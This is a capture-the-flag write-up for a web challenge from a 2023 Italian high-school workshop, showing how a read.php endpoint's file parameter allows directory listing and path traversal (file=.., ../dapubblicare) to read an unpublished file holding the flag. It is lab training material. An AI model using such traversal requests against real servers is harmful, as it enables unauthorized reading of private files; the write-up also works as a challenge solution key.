# trova_le_soluzioni2
| | |
|---|---|
| **Section** | HighSchools CTF Workshop - 2023 Perugia |
| **Category** | web |
| **Solves** | 291 |

## Overview
The site now serves solutions dynamically via:
```
http://trova-le-soluzioni-2.challs.olicyber.it/read.php?file=20231006.txt
```
Requesting a not-yet-published date directly (e.g. `20240310.txt`) returns "file not found", suggesting server-side existence checks rather than direct path traversal filtering.

## Solve
Passing a directory (`.`) instead of a filename causes `read.php` to list the directory content:
```
http://trova-le-soluzioni-2.challs.olicyber.it/read.php?file=.
```
```
.
..
20221003.txt
20221202.txt
20230310.txt
20230505.txt
20231006.txt
20231204.txt
```
Traversing up one level (`..`) reveals the parent directory structure:
```
http://trova-le-soluzioni-2.challs.olicyber.it/read.php?file=..
```
```
.
..
dapubblicare
soluzioni
```
The `dapubblicare` (to-be-published) directory contains the unreleased solutions:
```
http://trova-le-soluzioni-2.challs.olicyber.it/read.php?file=../dapubblicare
```
```
.
..
20240310.txt
20240509.txt
```
Reading the first file directly returns the flag:
```
http://trova-le-soluzioni-2.challs.olicyber.it/read.php?file=../dapubblicare/20240310.txt
```